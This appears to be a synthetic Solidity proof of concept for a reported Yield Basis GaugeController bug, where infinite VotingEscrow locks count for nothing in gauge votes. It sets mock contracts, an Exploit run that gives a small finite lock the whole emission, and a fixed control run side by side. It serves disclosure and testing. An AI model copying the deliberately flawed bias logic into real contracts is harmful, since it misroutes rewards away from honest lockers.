// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*//////////////////////////////////////////////////////////////////////////
    Yield Basis GaugeController ignores infinite VotingEscrow locks (#61924)

    SYNTHETIC, cheatcode-free. Verbatim bias from vote_for_gauge_weights
    at yb-core 3352c612:

        new_slope = slope * weight / 10000
        new_bias  = new_slope * (lock_end - block.timestamp)

    An infinite lock stores slope 0 and a constant bias equal to the deposit.
    new_bias is therefore 0, so the vote adds nothing. A 100-token finite
    lock takes the whole 10000-token emission. The fix uses the locked amount
    when slope is 0. One transaction. No warp. The 10-day vote delay is not
    part of the bug and is omitted so the vote is reachable at timestamp 1.
//////////////////////////////////////////////////////////////////////////*/

contract Token {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract VotingEscrow {
    struct Lock {
        uint256 amount;
        uint256 end;
        uint256 slope;
    }

    mapping(address => Lock) public locks;

    function lock(uint256 amount, uint256 duration) external {
        uint256 end = block.timestamp + duration;
        locks[msg.sender] = Lock(amount, end, amount / duration);
    }

    function lockInfinite(uint256 amount) external {
        locks[msg.sender] = Lock(amount, type(uint256).max, 0);
    }

    function getLastUserSlope(address u) external view returns (uint256) {
        return locks[u].slope;
    }

    function lockedEnd(address u) external view returns (uint256) {
        return locks[u].end;
    }

    function lockedAmount(address u) external view returns (uint256) {
        return locks[u].amount;
    }
}

contract GaugeController {
    struct VotedSlope {
        uint256 slope;
        uint256 power;
        uint256 end;
    }

    VotingEscrow public immutable escrow;
    bool public immutable countInfinite;
    mapping(address => mapping(address => VotedSlope)) public voteUserSlopes;
    mapping(address => uint256) public biasOf;

    constructor(VotingEscrow e, bool countInfinite_) {
        escrow = e;
        countInfinite = countInfinite_;
    }

    function vote(address gauge, uint256 userWeight) external {
        uint256 slope = escrow.getLastUserSlope(msg.sender);
        uint256 lockEnd = escrow.lockedEnd(msg.sender);
        require(lockEnd > block.timestamp, "Expired");
        require(userWeight <= 10_000, "Weight too large");

        VotedSlope memory old = voteUserSlopes[msg.sender][gauge];
        uint256 oldDt = old.end > block.timestamp ? old.end - block.timestamp : 0;
        uint256 oldBias = old.slope * oldDt;
        uint256 newSlope = slope * userWeight / 10_000;
        uint256 newDt = lockEnd - block.timestamp;
        uint256 newBias;
        if (countInfinite && slope == 0) {
            newBias = escrow.lockedAmount(msg.sender) * userWeight / 10_000;
        } else {
            // @> VULN: infinite lock slope is 0, so this bias is 0
            newBias = newSlope * newDt;
        }
        biasOf[gauge] = biasOf[gauge] + newBias - oldBias;
        voteUserSlopes[msg.sender][gauge] = VotedSlope(newSlope, userWeight, lockEnd);
    }
}

contract Alice {
    function lockInfinite(VotingEscrow ve, uint256 amount) external {
        ve.lockInfinite(amount);
    }

    function vote(GaugeController gc, address gauge, uint256 weight) external {
        gc.vote(gauge, weight);
    }
}

contract Exploit {
    Token public token; // CREATE 1
    VotingEscrow public escrow; // CREATE 2
    GaugeController public gc; // CREATE 3
    Alice public alice; // CREATE 4

    address public constant GAUGE_A = 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa;
    address public constant GAUGE_B = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;

    uint256 public biasA;
    uint256 public biasB;
    uint256 public alicePaid;
    uint256 public bobPaid;
    uint256 public constant POT = 10_000 ether;
    uint256 public constant ALICE_LOCK = 9900 ether;
    uint256 public constant BOB_LOCK = 100 ether;

    constructor() {
        token = new Token();
        escrow = new VotingEscrow();
        gc = new GaugeController(escrow, false);
        alice = new Alice();
    }

    function run() external {
        alice.lockInfinite(escrow, ALICE_LOCK);
        escrow.lock(BOB_LOCK, 100);
        alice.vote(gc, GAUGE_A, 10_000);
        gc.vote(GAUGE_B, 10_000);
        biasA = gc.biasOf(GAUGE_A);
        biasB = gc.biasOf(GAUGE_B);
        token.mint(address(this), POT);
        uint256 total = biasA + biasB;
        alicePaid = total == 0 ? 0 : POT * biasA / total;
        bobPaid = total == 0 ? 0 : POT * biasB / total;
        if (alicePaid > 0) token.transfer(address(alice), alicePaid);
        require(biasA == 0, "infinite vote ignored");
        require(biasB == BOB_LOCK, "finite bias is the lock");
        require(alicePaid == 0, "alice gauge got 0");
        require(bobPaid == POT, "bob gauge took 10000");
        require(token.balanceOf(address(this)) == POT, "exploit holds the pot");
    }
}

contract ControlExploit {
    Token public token;
    VotingEscrow public escrow;
    GaugeController public gc;
    Alice public alice;
    address public constant GAUGE_A = 0xaAaAaAaaAaAaAaaAaAAAAAAAAaaaAaAaAaaAaaAa;
    address public constant GAUGE_B = 0xbBbBBBBbbBBBbbbBbbBbbbbBBbBbbbbBbBbbBBbB;
    uint256 public alicePaid;
    uint256 public bobPaid;
    uint256 public constant POT = 10_000 ether;

    constructor() {
        token = new Token();
        escrow = new VotingEscrow();
        gc = new GaugeController(escrow, true);
        alice = new Alice();
    }

    function run() external {
        alice.lockInfinite(escrow, 9900 ether);
        escrow.lock(100 ether, 100);
        alice.vote(gc, GAUGE_A, 10_000);
        gc.vote(GAUGE_B, 10_000);
        uint256 biasA = gc.biasOf(GAUGE_A);
        uint256 biasB = gc.biasOf(GAUGE_B);
        token.mint(address(this), POT);
        alicePaid = POT * biasA / (biasA + biasB);
        bobPaid = POT - alicePaid;
        token.transfer(address(alice), alicePaid);
        require(biasA == 9900 ether, "infinite bias counted");
        require(biasB == 100 ether, "finite bias");
        require(alicePaid == 9900 ether, "alice 9900");
        require(bobPaid == 100 ether, "bob 100");
        require(token.balanceOf(address(alice)) == 9900 ether, "alice paid");
    }
}
